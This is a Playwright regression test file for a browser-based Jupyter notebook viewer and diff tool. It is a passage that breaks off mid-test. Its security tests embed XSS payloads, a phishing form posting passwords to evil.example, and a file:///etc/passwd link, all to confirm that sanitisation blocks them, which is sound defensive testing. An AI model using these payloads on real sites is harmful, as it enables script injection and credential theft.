// Regression tests. Run: npm install && npx playwright install chromium && npm test
// (set CHROMIUM_PATH to use an existing Chromium; set BROWSER=firefox or BROWSER=webkit to test another engine). Everything runs offline against a local server.
const fs = require('fs');
const path = require('path');
const { start, stop, open, state, nb, md, code } = require('./harness');

const H = '#/github/o/r/blob/main/t.ipynb';
const OUT = path.join(__dirname, 'out');
const tests = [];
const test = (name, fn) => tests.push({ name, fn });
const assert = (cond, detail) => { if (!cond) throw new Error(detail === undefined ? 'assertion failed' : typeof detail === 'string' ? detail : JSON.stringify(detail)); };
const good = nb([md('hello')]);
const run = async (opts, fn) => { const s = await open(opts); try { return await fn(s); } finally { await s.ctx.close(); } };

/* ---------- security ---------- */

test('sanitizer: forms and overlays are removed and author CSS stays scoped to its cell', () => run({
  hash: H, settle: 400,
  raw: nb([
    md('<form action="https://evil.example/steal" method="post"><input name="pw" type="password"><button>Sign in</button></form>\n\n<div style="position:fixed;inset:0;z-index:999999;background:#fff">overlay</div>\n\n<p>x</p><style>.bar{display:none!important}</style>'),
    code('1', [{ output_type: 'display_data', metadata: {}, data: { 'text/html': ['<form action="https://evil.example/x"><input type="password"></form><div style="position:fixed;inset:0">o</div><style>.bar{display:none}</style>'] } }]),
  ]),
}, async ({ page }) => {
  const r = await page.evaluate(() => ({
    forms: document.querySelectorAll('.cells form, .cells input, .cells button:not(.btn)').length,
    unscoped: [...document.querySelectorAll('.cells style')].filter(st => !/^\s*\.nbv-/.test(st.textContent)).length,
    fixed: [...document.querySelectorAll('.cells *')].filter(e => getComputedStyle(e).position === 'fixed').length,
    barVisible: getComputedStyle(document.querySelector('.bar')).display !== 'none',
    topIsApp: !!document.elementFromPoint(50, 20).closest('.bar'),
  }));
  assert(r.forms === 0 && r.unscoped === 0 && r.fixed === 0 && r.barVisible && r.topIsApp, r);
}));

test('xss corpus: nothing executes', () => run({
  hash: H, settle: 500,
  raw: nb([
    md('<img src=x onerror="window.__pwn=1">\n\n<svg onload="window.__pwn=2"></svg>\n\n[a](javascript:window.__pwn=3)\n\n<iframe srcdoc="<script>parent.__pwn=4</script>"></iframe>\n\n<details open ontoggle="window.__pwn=5">x</details>\n\n<math><mtext><table><mglyph><style><img src=x onerror="window.__pwn=6">'),
    code('1', [{ output_type: 'display_data', metadata: {}, data: { 'text/html': ['<script>window.__pwn=7</script><object data="javascript:window.__pwn=8"></object><a href="java&#9;script:window.__pwn=9">x</a>'], 'image/svg+xml': ['<svg onload="window.__pwn=10"/>'] } }]),
  ]),
}, async ({ page }) => {
  assert(await page.evaluate(() => window.__pwn === undefined), 'a payload ran');
  assert(await page.evaluate(() => ![...document.querySelectorAll('.cells a')].some(a => /^\s*javascript:/i.test(a.getAttribute('href') || ''))), 'javascript: link survived');
}));

test('#/url/ rejects data:, javascript: and file: links', async () => {
  for (const u of ['data:application/json;base64,e30=', 'javascript:alert(1)', 'file:///etc/passwd']) {
    await run({ hash: '#/url/' + encodeURIComponent(u), settle: 300 }, async ({ page, requests }) => {
      const s = await state(page);
      assert(s.cells === 0 && s.err && !requests.length, { u, s });
    });
  }
});

test('#/url/ accepts nbviewer-style forms (//host, /urls/, /url/)', async () => {
  const want = [['#/url/' + encodeURIComponent('//host.example/a.ipynb'), 'http://host.example/a.ipynb'], ['#/urls/host.example/a.ipynb', 'https://host.example/a.ipynb'], ['#/url/host.example/a.ipynb', 'http://host.example/a.ipynb']];
  for (const [hash, expect] of want) {
    await run({ hash, other: u => (u.includes('host.example') ? { body: JSON.stringify(good) } : null), settle: 300 }, async ({ page, requests }) => {
      assert(requests[0] === expect && (await state(page)).cells === 1, { hash, requests });
    });
  }
});

/* ---------- limits and failures ---------- */

test('math: oversized equations become plain text quickly; normal math and macros still render', async () => {
  const t0 = Date.now();
  await run({ hash: H, settle: 300, timeout: 30000, raw: nb([md('$' + '\\frac{'.repeat(500) + 'x' + '}{1}'.repeat(500) + '$'), md('$$' + 'x+'.repeat(20000) + 'x$$')]) }, async ({ page }) => {
    const r = await page.evaluate(() => ({ skipped: document.querySelectorAll('.math-skipped').length }));
    assert(r.skipped >= 2 && Date.now() - t0 < 9000, { r, ms: Date.now() - t0 });
  });
  await run({ hash: H, settle: 300, raw: nb([md('ok $E=mc^2$ and $$\\int_0^1 x\\,dx$$'), md('$\\def\\foo{x^2}$ and $\\foo$')]) }, async ({ page }) => {
    const r = await page.evaluate(() => ({ katex: document.querySelectorAll('.katex').length, skipped: document.querySelectorAll('.math-skipped').length }));
    assert(r.katex === 4 && r.skipped === 0, r);
  });
});

test('code: a 1 MB cell is plain text and fast; a 100 KB cell is still highlighted', async () => {
  const t0 = Date.now();
  await run({ hash: H, settle: 200, raw: nb([code('x = 1\n'.repeat(Math.floor(1048576 / 6)))]) }, async ({ page }) => {
    const spans = await page.evaluate(() => document.querySelectorAll('.input pre code span').length);
    assert(spans === 0 && Date.now() - t0 < 4000, { spans, ms: Date.now() - t0 });
  });
  await run({ hash: H, settle: 200, raw: nb([code('x = 1 * 2\n'.repeat(10000))]) }, async ({ page }) => {
    assert(await page.evaluate(() => document.querySelectorAll('.input pre code span').length > 1000), 'not highlighted');
  });
});

test('failed cells show a placeholder and neighbours are intact', () => run({
  hash: H, settle: 300,
  raw: nb([md('first'), null, md('>'.repeat(20000) + ' too deep'), code('print(1)', { not: 'an array' }), code('2', [{ output_type: 'display_data', data: 'str' }, { output_type: 'stream', name: 'stdout', text: ['ok output\n'] }]), md('last')]),
  timeout: 40000,
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ failed: document.querySelectorAll('.cell-failed').length, text: document.querySelector('.cells').textContent }));
  assert(r.failed >= 2 && r.text.includes('first') && r.text.includes('last') && r.text.includes('ok output'), r.failed);
}));

test('a 9 MB markdown cell of ordinary text either renders or shows a placeholder, and the tab stays alive', () => run({
  hash: H, settle: 300, timeout: 60000, raw: nb([md('word '.repeat(Math.floor(9 * 1048576 / 5))), md('last')]),
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ cells: document.querySelectorAll('.cell').length, last: document.querySelector('.cells').textContent.includes('last') }));
  assert(r.cells === 2 && r.last, r);
}));

test('large files: local 10.5 MB asks first and "Open anyway" works', () => run({ hash: '', settle: 200 }, async ({ page }) => {
  const buffer = Buffer.from(JSON.stringify(nb([md('word '.repeat(Math.floor(10.5 * 1048576 / 5)))])));
  await page.setInputFiles('#file-input', { name: 'big.ipynb', mimeType: 'application/json', buffer });
  await page.waitForSelector('#big-open', { timeout: 20000 });
  await page.click('#big-open');
  await page.waitForSelector('.cell', { timeout: 60000 });
}));

test('2,000 cells render in a few seconds and the first cell appears fast', () => run({
  hash: H, timeout: 60000, waitFor: '.cell',
  raw: nb(Array.from({ length: 2000 }, (_, i) => (i % 2 ? md('text ' + i + ' $x_{' + i + '}$') : code('x = ' + i, [{ output_type: 'stream', name: 'stdout', text: ['out ' + i + '\n'] }], i)))),
}, async ({ page }) => {
  const t0 = Date.now();
  await page.waitForFunction(() => document.querySelectorAll('.cell').length >= 2000, null, { timeout: 60000 });
  assert(Date.now() - t0 < 12000, Date.now() - t0);
}));

/* ---------- storage and input robustness ---------- */

test('corrupt nbv.recent does not break the home page', async () => {
  for (const v of ['"x"', '[null]', '{"a":1}', '[{"hash":5}]', '[{"hash":"#/ok","title":5}]']) {
    await run({ hash: '', init: `localStorage.setItem('nbv.recent', ${JSON.stringify(v)})`, settle: 200 }, async ({ page }) => {
      const s = await state(page);
      assert(!s.err && await page.$('.home'), { v, s });
    });
  }
});

test('a huge link is not saved to recents and keeps the title short', () => run({
  hash: '#/url/' + encodeURIComponent('https://host.example/' + 'a'.repeat(300000) + '.ipynb'),
  other: u => (u.includes('host.example') ? { body: JSON.stringify(good) } : null), settle: 500, timeout: 30000,
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ stored: (localStorage.getItem('nbv.recent') || '').length, title: document.title.length }));
  assert(r.stored < 5000 && r.title < 200, r);
}));

test('token: invalid characters are refused on save and explained when already saved', async () => {
  await run({ hash: '', settle: 200 }, async ({ page }) => {
    await page.click('#settings-btn');
    await page.fill('#token-input', 'ghp_abc​def');
    await page.click('#settings button[value="save"]');
    assert(await page.evaluate(() => document.querySelector('#settings').open && !document.querySelector('#token-error').hidden), 'dialog closed or no message');
    assert(await page.evaluate(() => localStorage.getItem('nbv.token') === null), 'bad token was stored');
  });
  await run({ hash: '#/github/o', init: `localStorage.setItem('nbv.token', JSON.stringify('ghp_abc\\u200bdef'))`, api: [], settle: 300 }, async ({ page }) => {
    const s = await state(page);
    assert(/token looks wrong/i.test(s.err) && await page.$('#err-token'), s);
  });
});

test('input parsing: where each pasted string goes', async () => {
  const table = [
    ['jakevdp', '#/github/jakevdp'],
    ['jakevdp/PythonDataScienceHandbook', '#/github/jakevdp/PythonDataScienceHandbook'],
    ['https://github.com/o/r/blob/main/a.ipynb?plain=1#L5', '#/github/o/r/blob/main/a.ipynb'],
    ['https://raw.githubusercontent.com/o/r/main/dir/a.ipynb', '#/github/o/r/blob/main/dir/a.ipynb'],
    ['https://gist.github.com/someone/0123abcd', '#/gist/0123abcd'],
    ['https://nbviewer.org/github/o/r/blob/main/a.ipynb', '#/github/o/r/blob/main/a.ipynb'],
    ['https://nbviewer.org/gist/someone/0123abcd', '#/gist/0123abcd'],
    ['https://nbviewer.org/urls/example.com/x.ipynb', '#/url/https://example.com/x.ipynb'],
    ['https://nbviewer.org/url/example.com/x.ipynb', '#/url/http://example.com/x.ipynb'],
    ['https://colab.research.google.com/github/o/r/blob/main/a.ipynb', '#/github/o/r/blob/main/a.ipynb'],
    ['git@github.com:o/r.git', '#/github/o/r'],
    ['https://example.com/a.ipynb', '#/url/https://example.com/a.ipynb'],
  ];
  await run({ hash: '', settle: 200 }, async ({ page }) => {
    for (const [input, want] of table) {
      await page.evaluate(v => { const i = document.querySelector('#jump-input'); i.value = v; document.querySelector('#jump').requestSubmit(); }, input);
      await page.waitForTimeout(150);
      const got = await page.evaluate(() => decodeURIComponent(location.hash));
      assert(got === want, { input, want, got });
    }
  });
});

test('a blob link to a file that is not a notebook opens its folder', () => run({ hash: '#/github/o/r/blob/main/dir/README.md', api: [{ name: 'a.ipynb', path: 'dir/a.ipynb', type: 'file', size: 10 }], settle: 500 }, async ({ page }) => {
  const r = await page.evaluate(() => ({ hash: location.hash, rows: document.querySelectorAll('.listing li').length }));
  assert(r.hash === '#/github/o/r/tree/main/dir' && r.rows >= 1, r);
}));

test('Google Drive and Colab Drive links explain themselves', () => run({ hash: '#/url/' + encodeURIComponent('https://colab.research.google.com/drive/1abc'), settle: 300 }, async ({ page, requests }) => {
  const s = await state(page);
  assert(/Drive and Colab/.test(s.err) && !requests.length, s);
}));

/* ---------- notebook formats and API shapes ---------- */

test('nbformat 3 and malformed files fail cleanly', async () => {
  const v3 = cells => ({ nbformat: 3, nbformat_minor: 0, metadata: {}, worksheets: [{ cells }] });
  const ok = [v3([{ cell_type: 'heading', level: 1000000000, source: ['x'] }]), v3([{ cell_type: 'heading', level: -1, source: ['x'] }]), v3([null, { cell_type: 'markdown', source: ['ok'] }]), v3([{ cell_type: 'code', input: ['1'], outputs: [null, { output_type: 'stream', stream: 'stdout', text: ['hi'] }] }])];
  for (const body of ok) await run({ hash: H, raw: body, settle: 250 }, async ({ page }) => { const s = await state(page); assert(!s.err && s.cells >= 1, s); });
  for (const body of ['null', '[]', '"x"', '{}']) await run({ hash: H, raw: body, settle: 250 }, async ({ page }) => { const s = await state(page); assert(s.err && !/Cannot read|Invalid/.test(s.errText || ''), { body, s }); });
});

test('odd GitHub API answers give an error, not a spinner or "undefined"', async () => {
  await run({ hash: '#/github/o/r', api: u => (/repos\/o\/r$/.test(u.split('?')[0]) ? { body: '{}' } : null), settle: 600 }, async ({ page }) => {
    const s = await state(page); assert(s.err && !(await page.$('.loading')), s);
  });
  await run({ hash: '#/github/o', api: { body: '{}' }, settle: 400 }, async ({ page }) => {
    const s = await state(page); assert(s.err && !/undefined/.test(await page.evaluate(() => document.body.innerText)), s);
  });
  await run({ hash: '#/github/o/r/tree/main/', api: [{ path: 'x' }], settle: 400 }, async ({ page }) => {
    assert(!/undefined|localeCompare/.test(await page.evaluate(() => document.body.innerText)), 'broken listing');
  });
});

/* ---------- layout and accessibility ---------- */

test('320px phone: a long filename does not scroll the page sideways', () => run({
  hash: '#/github/o/r/blob/main/My_Very_Long_Notebook_Name_For_Testing_2024.ipynb', raw: good, viewport: { width: 320, height: 700 }, settle: 300,
}, async ({ page }) => assert(!(await state(page)).hscroll, 'horizontal scroll')));

test('axe: no violations on home, notebook and error pages', async () => {
  const axeFile = require.resolve('axe-core/axe.min.js');
  const wide = nb([code('x = "' + 'y'.repeat(400) + '"', [{ output_type: 'execute_result', execution_count: 1, metadata: {}, data: { 'text/plain': ['1'] } }], 1)]);
  for (const [name, opts] of [['home', { hash: '' }], ['notebook', { hash: H, raw: wide }], ['error', { hash: H, raw: () => ({ status: 404, body: 'x', type: 'text/plain' }) }]]) {
    await run({ ...opts, settle: 300 }, async ({ page }) => {
      await page.addScriptTag({ path: axeFile });
      const v = await page.evaluate(() => axe.run(document, { runOnly: ['wcag2a', 'wcag2aa', 'best-practice'] }).then(r => r.violations.map(x => `${x.id} (${x.nodes.length})`)));
      assert(!v.length, { name, v });
    });
  }
});

/* ---------- exports ---------- */

test('export: .py, .md and .html contents', () => run({
  hash: '#/github/o/r/blob/main/My Note.ipynb', settle: 600,
  raw: nb([md('# Title\n\nMath $E=mc^2$'), code('%matplotlib inline\nx = 1\n!ls', [{ output_type: 'stream', name: 'stdout', text: ['a ``` b\n'] }], 1), code('1/0', [{ output_type: 'error', ename: 'E', evalue: 'v', traceback: ['\u001b[31mE\u001b[0m: v'] }], 2)]),
}, async ({ page }) => {
  fs.mkdirSync(OUT, { recursive: true });
  const get = async kind => { await page.click('#export-menu summary'); const [d] = await Promise.all([page.waitForEvent('download'), page.click(`[data-export="${kind}"]`)]); const f = path.join(OUT, d.suggestedFilename()); await d.saveAs(f); return { name: d.suggestedFilename(), text: fs.readFileSync(f, 'utf8') }; };
  const py = await get('py'); assert(py.name === 'My Note.py' && /# %matplotlib inline/.test(py.text) && /# !ls/.test(py.text) && /\nx = 1\n/.test(py.text), py.text);
  const mdf = await get('md'); assert(/# Title/.test(mdf.text) && /```python\n%matplotlib/.test(mdf.text) && /````text\na ``` b\n````/.test(mdf.text) && !/\u001b/.test(mdf.text), mdf.text);
  const html = await get('html'); assert(/Content-Security-Policy/.test(html.text) && !/<script/i.test(html.text) && /class="katex"/.test(html.text), 'html export');
}));

test('export menu: no .py item for non-Python notebooks; print styles hide the toolbar', () => run({
  hash: H, raw: nb([code('x <- 1')], { kernelspec: { display_name: 'R', language: 'R', name: 'ir' }, language_info: { name: 'R' } }), settle: 300,
}, async ({ page }) => {
  assert(await page.evaluate(() => !document.querySelector('[data-export="py"]') && !!document.querySelector('[data-export="md"]')), 'menu items');
  await page.emulateMedia({ media: 'print' });
  assert(await page.evaluate(() => getComputedStyle(document.querySelector('.toolbar')).display === 'none' && getComputedStyle(document.querySelector('.bar')).display === 'none'), 'print styles');
}));

test('fonts are self-hosted: nothing leaves the site except GitHub', () => run({ hash: H, raw: good, settle: 600 }, async ({ page, requests }) => {
  const external = requests.filter(u => !/raw\.githubusercontent\.com/.test(u));
  assert(!external.length, external);
  const loaded = await page.evaluate(async () => { await document.fonts.ready; return [...document.fonts].filter(f => f.status === 'loaded').map(f => f.family); });
  assert(loaded.some(f => /JetBrains/.test(f)) && loaded.some(f => /Source Serif/.test(f)), loaded);
}));

/* ---------- contents and output toggles ---------- */

const tocNb = nb([
  md('# Intro\n\nSome text.'),
  code('x = 1', [{ output_type: 'stream', name: 'stdout', text: ['hello output\\n'] }]),
  md('## Setup\n\n### Install <b>deps</b>\n\ntext'),
  md('no heading here'),
  md('#### Deep\n\n' + 'filler\n\n'.repeat(120) + '## Far away section\n\n' + 'filler\n\n'.repeat(120)),
]);

test('contents menu lists the headings in order and jumps to them', () => run({ hash: H, raw: tocNb, settle: 500 }, async ({ page }) => {
  const items = await page.evaluate(() => [...document.querySelectorAll('#toc-list .toc-item')].map(b => [b.className.match(/toc-l(\d)/)[1], b.textContent]));
  assert(JSON.stringify(items) === JSON.stringify([['1', 'Intro'], ['2', 'Setup'], ['3', 'Install deps'], ['4', 'Deep'], ['2', 'Far away section']]), items);
  await page.click('#toc-menu summary');
  await page.click('.toc-item:last-child');
  await page.waitForTimeout(400);
  const r = await page.evaluate(() => { const h = [...document.querySelectorAll('.cells h2')].find(x => /Far away/.test(x.textContent)); const top = h.getBoundingClientRect().top; return { top, open: document.querySelector('#toc-menu').open, scrolled: window.scrollY > 500 }; });
  assert(r.scrolled && r.top >= 0 && r.top < 300 && !r.open, r);
}));

test('contents menu stays hidden without headings and closes on Escape', async () => {
  await run({ hash: H, raw: nb([md('just text'), code('1')]), settle: 300 }, async ({ page }) => {
    assert(await page.evaluate(() => document.querySelector('#toc-menu').hidden), 'menu shown without headings');
  });
  await run({ hash: H, raw: tocNb, settle: 400 }, async ({ page }) => {
    await page.click('#toc-menu summary');
    assert(await page.evaluate(() => document.querySelector('#toc-menu').open), 'did not open');
    await page.keyboard.press('Escape');
    assert(await page.evaluate(() => !document.querySelector('#toc-menu').open), 'Escape did not close it');
  });
});

test('hide outputs: outputs disappear, code stays, and the HTML export keeps the choice', () => run({ hash: H, raw: tocNb, settle: 400 }, async ({ page }) => {
  const vis = () => page.evaluate(() => ({ out: getComputedStyle(document.querySelector('.output-row')).display, input: getComputedStyle(document.querySelector('.input')).display, pressed: document.querySelector('#toggle-outputs').getAttribute('aria-pressed') }));
  assert((await vis()).out !== 'none', 'outputs hidden at start');
  await page.click('#toggle-outputs');
  const v = await vis();
  assert(v.out === 'none' && v.input !== 'none' && v.pressed === 'true', v);
  fs.mkdirSync(OUT, { recursive: true });
  await page.click('#export-menu summary');
  const [d] = await Promise.all([page.waitForEvent('download'), page.click('[data-export="html"]')]);
  const f = path.join(OUT, 'hide-outputs.html'); await d.saveAs(f);
  assert(/<body class="[^"]*hide-outputs/.test(fs.readFileSync(f, 'utf8')), 'export lost hide-outputs');
  await page.click('#toggle-outputs');
  assert((await vis()).out !== 'none', 'outputs did not come back');
}));

/* ---------- compare ---------- */

const diff = require('../assets/js/diff.js');
const dcell = (type, text, outputs) => ({ cell_type: type, source: [text], outputs: outputs || [], execution_count: 1, metadata: {} });
const kinds = entries => entries.map(e => e.kind).join(',');

test('diff engine: identical, added, removed, modified, reordered', () => {
  assert(kinds(diff.diffCells([dcell('code', 'a')], [dcell('code', 'a')])) === 'same');
  assert(kinds(diff.diffCells([], [dcell('code', 'a')])) === 'added');
  assert(kinds(diff.diffCells([dcell('code', 'a')], [])) === 'removed');
  assert(kinds(diff.diffCells([dcell('code', 'x = 1')], [dcell('code', 'x = 2')])) === 'modified');
  assert(kinds(diff.diffCells([dcell('markdown', 'note')], [dcell('code', 'totally different code')])) === 'removed,added', 'type change');
  assert(kinds(diff.diffCells([dcell('code', 'x'), dcell('code', 'y'), dcell('code', 'z')], [dcell('code', 'z'), dcell('code', 'x'), dcell('code', 'y')])) === 'added,same,same,removed', 'move');
  const lines = diff.diffLines('a\nb\nc', 'a\nB\nc\nd').map(l => l.t + ':' + l.text).join(',');
  assert(lines === 'eq:a,del:b,add:B,eq:c,add:d', lines);
});

test('diff engine: output text is compared, execution counts and images are not', () => {
  const out = text => [{ output_type: 'stream', name: 'stdout', text: [text] }];
  const a = dcell('code', 'p', out('hello\n')), b = dcell('code', 'p', out('bye\n'));
  b.execution_count = 7;
  const [e] = diff.diffCells([a], [b]);
  assert(e.kind === 'same' && e.outputsChanged && e.outputLines.some(l => l.t === 'add' && l.text === 'bye'), e);
  const img = d => dcell('code', 'q', [{ output_type: 'display_data', data: { 'image/png': d } }]);
  assert(!diff.diffCells([img('AAAA')], [img('BBBB')])[0].outputsChanged, 'image bytes should not count');
});

test('diff engine: thousands of cells stay fast and mostly aligned', () => {
  const a = Array.from({ length: 4000 }, (_, i) => dcell('code', 'line ' + i)), b = a.map((c, i) => (i % 40 === 0 ? dcell('code', 'other ' + i) : c));
  const t0 = Date.now();
  const s = diff.summarize(diff.diffCells(a, b));
  assert(Date.now() - t0 < 2000 && s.same >= 3800, { s, ms: Date.now() - t0 });
});

const oldNb = nb([md('# Title\n\nIntro'), code('import numpy as np\nx = np.arange(10)\nprint(x)', [{ output_type: 'stream', name: 'stdout', text: ['[0 1 2]\n'] }]), md('old note'), code('keep')]);
const newNb = nb([md('# Title\n\nIntro, updated'), code('import numpy as np\nx = np.arange(20)\nprint(x)\nprint(x.sum())', [{ output_type: 'stream', name: 'stdout', text: ['[0 1 2 3]\n6\n'] }]), code('brand new cell'), code('keep')]);
const byRef = u => ({ body: JSON.stringify(/\/oldref\//.test(u) ? oldNb : newNb) });
const CMP = '#/compare/github/o/r/oldref...newref/dir/nb.ipynb';

test('compare (GitHub): summary, both layouts, outputs toggle, unchanged cells and change navigation', () => run({ hash: CMP, raw: byRef, settle: 400 }, async ({ page }) => {
  const sum = await page.evaluate(() => ({ text: document.querySelector('#d-summary').textContent, unified: !!document.querySelector('.dunified') && !document.querySelector('.dsplit'), order: [...document.querySelectorAll('.toolbar button')].slice(0, 2).map(b => b.textContent), pressed: document.querySelector('#d-unified').getAttribute('aria-pressed'), changes: document.querySelectorAll('[data-change]').length }));
  assert(/2 modified, 1 added, 1 removed \(1 unchanged\)/.test(sum.text) && sum.unified && sum.changes === 4 && sum.pressed === 'true' && sum.order.join('|') === 'Unified|Side by side', sum);
  const del = await page.evaluate(() => [...document.querySelectorAll('.dline.del .dtext')].map(n => n.textContent));
  assert(del.includes('x = np.arange(10)') && del.includes('Intro'), del);
  await page.click('#d-split');
  assert(await page.evaluate(() => !!document.querySelector('.dsplit') && !document.querySelector('.dunified') && localStorage.getItem('nbv.diffLayout') === '"split"'), 'side by side layout');
  await page.click('#d-unified');
  assert(await page.evaluate(() => !!document.querySelector('.dunified') && localStorage.getItem('nbv.diffLayout') === '"unified"'), 'back to unified');
  assert(!(await page.$('.dout-label')), 'outputs shown too early');
  await page.click('#d-outputs');
  assert(await page.evaluate(() => document.querySelectorAll('.dout-label').length === 1 && !!document.querySelector('.dline.add .dtext')), 'output diff missing');
  await page.click('#d-expand');
  await page.waitForTimeout(100);
  assert(await page.evaluate(() => document.querySelector('.dgroup .dsame-text').textContent === 'keep'), 'unchanged cell text');
  await page.click('#d-next'); await page.click('#d-next');
  assert(await page.evaluate(() => document.querySelector('#d-pos').textContent === 'Change 2 of 4'), 'navigation position');
  await page.click('#d-prev');
  assert(await page.evaluate(() => document.querySelector('#d-pos').textContent === 'Change 1 of 4' && document.activeElement.dataset.change === '1'), 'previous change');
}));

test('compare: opens unified on any screen size, and remembers a chosen side-by-side layout', async () => {
  for (const viewport of [{ width: 1400, height: 800 }, { width: 360, height: 800 }]) {
    await run({ hash: CMP, raw: byRef, viewport, settle: 300 }, async ({ page }) => {
      assert(await page.evaluate(() => !!document.querySelector('.dunified') && !document.querySelector('.dsplit')), { viewport });
    });
  }
  await run({ hash: CMP, raw: byRef, init: `localStorage.setItem('nbv.diffLayout', '"split"')`, settle: 300 }, async ({ page }) => {
    assert(await page.evaluate(() => !!document.querySelector('.dsplit')), 'saved side-by-side choice ignored');
  });
});

test('compare: notebook text is shown as text, never as HTML', () => run({
  hash: CMP, settle: 400,
  raw: u => ({ body: JSON.stringify(/\/oldref\//.test(u) ? nb([md('safe')]) : nb([md('<img src=x onerror="window.__pwn=1"><script>window.__pwn=2</script>'), code('print("<b>x</b>")')])) }),
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ pwn: window.__pwn, imgs: document.querySelectorAll('.diff img, .diff script, .diff b').length, text: document.querySelector('.diff').textContent }));
  assert(r.pwn === undefined && r.imgs === 0 && r.text.includes('<img src=x'), r);
}));

test('compare: a long unchanged run of lines folds and expands', () => run({
  hash: CMP, settle: 400,
  raw: u => ({ body: JSON.stringify(nb([code(Array.from({ length: 40 }, (_, i) => 'line ' + i).join('\n') + (/\/oldref\//.test(u) ? '\nold end' : '\nnew end'))])) }),
}, async ({ page }) => {
  const before = await page.evaluate(() => document.querySelectorAll('.dline').length);
  await page.click('.dfold');
  const after = await page.evaluate(() => document.querySelectorAll('.dline').length);
  assert(before < 25 && after > before + 20, { before, after });
}));

test('compare: a file missing at one version, an unknown ref and a bad link explain themselves', async () => {
  await run({ hash: CMP, raw: u => (/\/oldref\//.test(u) ? { status: 404, body: 'Not Found', type: 'text/plain' } : { body: JSON.stringify(newNb) }), settle: 300 }, async ({ page }) => {
    const s = await state(page);
    assert(/Not found at oldref/.test(s.err) && /dir\/nb\.ipynb/.test(s.errText), s);
  });
  await run({ hash: '#/compare/github/o/r/justone/dir/nb.ipynb', raw: good, settle: 300 }, async ({ page }) => {
    assert((await state(page)).err, 'no message for a link without two refs');
  });
});

test('compare dialog: pick a recent commit, submit, and land on the diff', () => {
  const sha = 'a'.repeat(40);
  return run({
    hash: H, settle: 400,
    raw: u => ({ body: JSON.stringify(u.includes(sha) ? oldNb : newNb) }),
    api: u => (/\/commits\?/.test(u) ? { body: JSON.stringify([{ sha, commit: { message: 'Tidy the intro\n\nlong body', author: { date: '2026-01-02T03:04:05Z' } } }, { sha: 'bad', commit: {} }]) } : null),
  }, async ({ page }) => {
    await page.click('#compare-btn');
    assert(await page.evaluate(() => document.querySelector('#compare-dialog').open), 'dialog did not open');
    await page.fill('#compare-base', 'two words');
    await page.click('#compare-form button[type="submit"]');
    assert(await page.evaluate(() => document.querySelector('#compare-dialog').open && !document.querySelector('#compare-error').hidden), 'bad ref accepted');
    await page.click('#compare-load');
    await page.waitForSelector('.commit-item');
    assert(await page.evaluate(() => document.querySelectorAll('.commit-item').length === 1 && /Tidy the intro/.test(document.querySelector('.commit-item').textContent)), 'commit list');
    await page.click('.commit-item');
    await page.click('#compare-form button[type="submit"]');
    await page.waitForSelector('.diffview');
    const r = await page.evaluate(() => ({ hash: decodeURIComponent(location.hash), sum: document.querySelector('#d-summary').textContent }));
    assert(r.hash === `#/compare/github/o/r/${sha}...main/t.ipynb` && /modified/.test(r.sum), r);
  });
});

test('compare two local files', () => run({ hash: '#/compare', settle: 300 }, async ({ page }) => {
  await page.click('#mode-files');
  assert(await page.evaluate(() => document.querySelector('#compare-go').disabled), 'button should start disabled');
  const file = (name, body) => ({ name, mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(body)) });
  await page.setInputFiles('#file-a', file('before.ipynb', oldNb));
  await page.setInputFiles('#file-b', file('after.ipynb', newNb));
  await page.click('#compare-go');
  await page.waitForSelector('.diffview');
  const r = await page.evaluate(() => ({ sum: document.querySelector('#d-summary').textContent, labels: document.querySelector('.dlabels').textContent }));
  assert(/2 modified, 1 added, 1 removed/.test(r.sum) && r.labels === 'before.ipynb to after.ipynb', r);
}));

test('compare: a file that is not a notebook is reported, not crashed on', () => run({ hash: '#/compare', settle: 300 }, async ({ page }) => {
  await page.click('#mode-files');
  await page.setInputFiles('#file-a', { name: 'a.ipynb', mimeType: 'application/json', buffer: Buffer.from('not json') });
  await page.setInputFiles('#file-b', { name: 'b.ipynb', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(good)) });
  await page.click('#compare-go');
  await page.waitForTimeout(200);
  assert(await page.evaluate(() => !document.querySelector('#compare-msg').hidden && /isn't valid JSON/.test(document.querySelector('#compare-msg').textContent)), 'no message');
}));

const rawOf = (o, r, ref, path) => `https://raw.githubusercontent.com/${o}/${r}/${ref}/${path}`;
const twoRepos = u => ({ body: JSON.stringify(u.includes('/alice/') ? oldNb : newNb) });

test('compare two notebooks by link: different repos, shorthand and swap', () => run({
  hash: '#/compare/links/' + encodeURIComponent(rawOf('alice', 'one', 'main', 'a/nb.ipynb')) + '/' + encodeURIComponent(rawOf('bob', 'two', 'dev', 'b/nb.ipynb')),
  raw: twoRepos, settle: 400,
}, async ({ page }) => {
  const r = await page.evaluate(() => ({ labels: document.querySelector('.dlabels').textContent, sum: document.querySelector('#d-summary').textContent, title: document.querySelector('.nb-title').textContent, links: [...document.querySelectorAll('.toolbar a')].map(a => [a.textContent, a.getAttribute('href')]) }));
  assert(r.labels === 'alice/one@main to bob/two@dev' && /2 modified, 1 added, 1 removed/.test(r.sum) && r.title === 'nb.ipynb', r);
  const openA = r.links.find(l => l[0] === 'Open original'), openB = r.links.find(l => l[0] === 'Open modified'), swap = r.links.find(l => l[0] === 'Swap sides');
  assert(openA[1] === '#/github/alice/one/blob/main/a/nb.ipynb' && openB[1] === '#/github/bob/two/blob/dev/b/nb.ipynb', r.links);
  assert(decodeURIComponent(swap[1]).startsWith('#/compare/links/' + rawOf('bob', 'two', 'dev', 'b/nb.ipynb')), swap);
}));

test('compare by link: the form accepts GitHub links, raw links, shorthand and plain URLs', async () => {
  const cases = [
    ['https://github.com/alice/one/blob/main/a/nb.ipynb', 'alice/one/a/nb.ipynb', rawOf('alice', 'one', 'main', 'a/nb.ipynb'), rawOf('alice', 'one', 'HEAD', 'a/nb.ipynb')],
    ['https://raw.githubusercontent.com/alice/one/v1/nb.ipynb', 'https://example.com/x/nb.ipynb', rawOf('alice', 'one', 'v1', 'nb.ipynb'), 'https://example.com/x/nb.ipynb'],
    ['https://nbviewer.org/github/alice/one/blob/main/nb.ipynb', 'github.com/bob/two/blob/dev/nb.ipynb', rawOf('alice', 'one', 'main', 'nb.ipynb'), rawOf('bob', 'two', 'dev', 'nb.ipynb')],
  ];
  for (const [a, b, wantA, wantB] of cases) {
    await run({ hash: '#/compare', settle: 300, raw: twoRepos, other: u => (u.includes('example.com') ? { body: JSON.stringify(newNb) } : null) }, async ({ page }) => {
